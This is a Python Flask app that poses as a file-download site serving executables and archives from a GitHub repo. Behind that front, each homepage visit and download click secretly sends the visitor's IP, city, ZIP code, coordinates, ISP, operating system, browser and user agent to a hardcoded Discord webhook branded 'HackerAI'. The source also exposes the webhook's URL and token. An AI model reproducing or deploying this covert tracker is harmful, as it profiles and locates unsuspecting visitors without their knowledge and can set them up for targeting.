import os
import time
import uuid
import requests
from flask import Flask, render_template, request

app = Flask(__name__)

# ============================================================
# 🎯 CONFIGURAÇÃO
# ============================================================
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1540114660370550804/502O_M9Q2jzholD8UXekoDTCGHeUwr1TznCXR75s3ZiM8oqW7TCnXvZHK7YIMs02cm9g"

GITHUB_REPO_OWNER = "malucomaf16"
GITHUB_REPO_NAME   = "downloads-website"
GITHUB_FILES_PATH  = "arquivos"
GITHUB_BRANCH      = "main"

GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")

# Filtro: IPs do Render (Oregon / health checks) - não envia webhook pra eles
FILTERED_IPS = [
    "127.0.0.1", "::1", "localhost",
]
# Se o IP começar com algum desses, ignora (Render health check)
FILTERED_IP_PREFIXES = ["10.", "172.", "198.18."]
# ============================================================

HEADERS = {}
if GITHUB_TOKEN:
    HEADERS["Authorization"] = f"token {GITHUB_TOKEN}"

EXT_ICONS = {
    ".exe": "⚙️", ".msi": "⚙️", ".dll": "🔧",
    ".zip": "📦", ".rar": "📦", ".7z": "📦", ".tar": "📦", ".gz": "📦",
    ".jpg": "🖼️", ".jpeg": "🖼️", ".png": "🖼️", ".gif": "🖼️", ".bmp": "🖼️", ".webp": "🖼️",
    ".pdf": "📄", ".doc": "📄", ".docx": "📄", ".txt": "📄", ".xls": "📄", ".xlsx": "📄",
    ".mp3": "🎵", ".wav": "🎵", ".flac": "🎵",
    ".mp4": "🎬", ".avi": "🎬", ".mkv": "🎬", ".mov": "🎬", ".wmv": "🎬",
    ".iso": "💿", ".img": "💿",
    ".py": "🐍", ".js": "🟨", ".html": "🌐", ".css": "🎨", ".php": "🐘",
    ".apk": "📱",
    ".dmg": "💻",
}

EXT_CATEGORIES = {
    ".exe": "Applications", ".msi": "Applications", ".dll": "Applications",
    ".zip": "Archives", ".rar": "Archives", ".7z": "Archives", ".tar": "Archives", ".gz": "Archives",
    ".jpg": "Images", ".jpeg": "Images", ".png": "Images", ".gif": "Images", ".bmp": "Images", ".webp": "Images",
    ".pdf": "Documents", ".doc": "Documents", ".docx": "Documents", ".txt": "Documents", ".xls": "Documents", ".xlsx": "Documents",
    ".mp3": "Audio", ".wav": "Audio", ".flac": "Audio",
    ".mp4": "Video", ".avi": "Video", ".mkv": "Video", ".mov": "Video", ".wmv": "Video",
    ".iso": "Disc Images", ".img": "Disc Images",
    ".py": "Code", ".js": "Code", ".html": "Code", ".css": "Code", ".php": "Code",
    ".apk": "Android",
    ".dmg": "macOS",
}


def is_filtered_ip(ip):
    """Verifica se o IP deve ser ignorado (health check do Render)"""
    if ip in FILTERED_IPS:
        return True
    for prefix in FILTERED_IP_PREFIXES:
        if ip.startswith(prefix):
            return True
    return False


def get_icon(ext):
    return EXT_ICONS.get(ext.lower(), "📁")


def get_category(ext):
    return EXT_CATEGORIES.get(ext.lower(), "Other")


def get_github_files():
    url = f"https://api.github.com/repos/{GITHUB_REPO_OWNER}/{GITHUB_REPO_NAME}/contents/{GITHUB_FILES_PATH}?ref={GITHUB_BRANCH}"
    try:
        resp = requests.get(url, headers=HEADERS, timeout=10)
        if resp.status_code == 200:
            contents = resp.json()
            files = []
            for item in contents:
                if item["type"] == "file":
                    name = item["name"]
                    ext = "." + name.rsplit(".", 1)[1] if "." in name else ""
                    size_mb = round(item["size"] / (1024 * 1024), 1)
                    raw_url = item["download_url"]
                    display_name = name.rsplit(".", 1)[0].replace("_", " ").replace("-", " ").strip()
                    files.append({
                        "name": display_name,
                        "filename": name,
                        "ext": ext,
                        "size_mb": size_mb,
                        "raw_url": raw_url,
                        "icon": get_icon(ext),
                        "category": get_category(ext),
                    })
            files.sort(key=lambda x: x["filename"])
            return files
        return []
    except:
        return []


def get_client_ip():
    if request.headers.get("X-Forwarded-For"):
        return request.headers.get("X-Forwarded-For").split(",")[0].strip()
    return request.remote_addr or "0.0.0.0"


def get_geolocation(ip):
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("status") == "success":
                return data
    except:
        pass
    return {"query": ip, "country": "Unknown", "regionName": "Unknown", "city": "Unknown",
            "zip": "", "lat": 0, "lon": 0, "isp": "Unknown", "org": "Unknown", "as": "Unknown"}


def parse_ua(ua):
    ua_l = ua.lower()
    if "windows" in ua_l: os_name = "Windows"
    elif "mac os" in ua_l or "macintosh" in ua_l: os_name = "macOS"
    elif "linux" in ua_l: os_name = "Linux"
    elif "android" in ua_l: os_name = "Android"
    elif "iphone" in ua_l or "ipad" in ua_l: os_name = "iOS"
    else: os_name = "Unknown"
    if "edg" in ua_l: browser = "Edge"
    elif "chrome" in ua_l: browser = "Chrome"
    elif "firefox" in ua_l: browser = "Firefox"
    elif "safari" in ua_l: browser = "Safari"
    elif "opera" in ua_l or "opr" in ua_l: browser = "Opera"
    else: browser = "Unknown"
    return os_name, browser


def send_webhook(action, file_name=""):
    ip = get_client_ip()
    
    # Filtra IPs do Render / health checks
    if is_filtered_ip(ip):
        print(f"[*] Filtered IP: {ip} (Render health check)")
        return
    
    ua = request.headers.get("User-Agent", "Unknown")
    os_name, browser = parse_ua(ua)
    geo = get_geolocation(ip)
    visit_id = str(uuid.uuid4())[:8]
    
    # Embed super organizado — TODOS OS CAMPOS inline=True pra ficar lado a lado
    embed = {
        "embeds": [{
            "title": f"⬇️ {'Download' if file_name else 'Visit'} — {file_name or 'Homepage'}",
            "color": 0x5865F2,
            "fields": [
                # 🔹 IDENTIFICAÇÃO
                {"name": "🆔 Visit ID", "value": visit_id, "inline": True},
                {"name": "📄 File", "value": file_name or "Homepage", "inline": True},
                {"name": "⏱️ Time", "value": time.strftime("%H:%M:%S UTC", time.gmtime()), "inline": True},
                
                # 🔹 LOCALIZAÇÃO (tudo junto)
                {"name": "🌐 IP Address", "value": f"`{ip}`", "inline": True},
                {"name": "📍 Country", "value": geo.get("country", "Unknown"), "inline": True},
                {"name": "🏙️ City", "value": geo.get("city", "Unknown"), "inline": True},
                {"name": "🗺️ Region", "value": geo.get("regionName", "Unknown"), "inline": True},
                {"name": "📮 ZIP Code", "value": geo.get("zip", "N/A"), "inline": True},
                {"name": "🌐 Coordinates", "value": f"{geo.get('lat', '?')}, {geo.get('lon', '?')}", "inline": True},
                
                # 🔹 REDE
                {"name": "🏢 ISP", "value": geo.get("isp", "Unknown"), "inline": True},
                {"name": "🏢 Organization", "value": geo.get("org", "Unknown"), "inline": True},
                {"name": "🔗 ASN", "value": geo.get("as", "Unknown"), "inline": True},
                
                # 🔹 SISTEMA
                {"name": "💻 OS", "value": os_name, "inline": True},
                {"name": "🌍 Browser", "value": browser, "inline": True},
                {"name": "🗣️ Language", "value": request.headers.get("Accept-Language", "Unknown"), "inline": True},
                {"name": "💾 Screen", "value": request.args.get("screen", "Unknown"), "inline": True},
                
                # 🔹 REFERÊNCIA
                {"name": "🔗 Referrer", "value": request.referrer or "Direct / None", "inline": False},
                {"name": "📋 User Agent", "value": f"```{ua[:500]}```", "inline": False},
            ],
            "footer": {"text": f"HackerAI • visit:{visit_id}"},
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
        }]
    }
    
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=embed, timeout=10)
        print(f"[+] Sent webhook | {ip} | {file_name or 'Homepage'} | ID:{visit_id}")
    except Exception as e:
        print(f"[!] Webhook error: {e}")


@app.route("/")
def index():
    files = get_github_files()
    send_webhook("Visited Homepage")
    
    categories = {}
    for f in files:
        cat = f["category"]
        if cat not in categories:
            categories[cat] = []
        categories[cat].append(f)
    
    return render_template("index.html", categories=categories, total_files=len(files))


@app.route("/download/<path:filename>")
def download_page(filename):
    files = get_github_files()
    file_data = None
    for f in files:
        if f["filename"] == filename:
            file_data = f
            break
    
    if not file_data:
        return render_template("404.html"), 404
    
    send_webhook("Clicked Download", file_data["filename"])
    return render_template("download.html", file=file_data)


@app.route("/track")
def track():
    return {"status": "ok"}


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
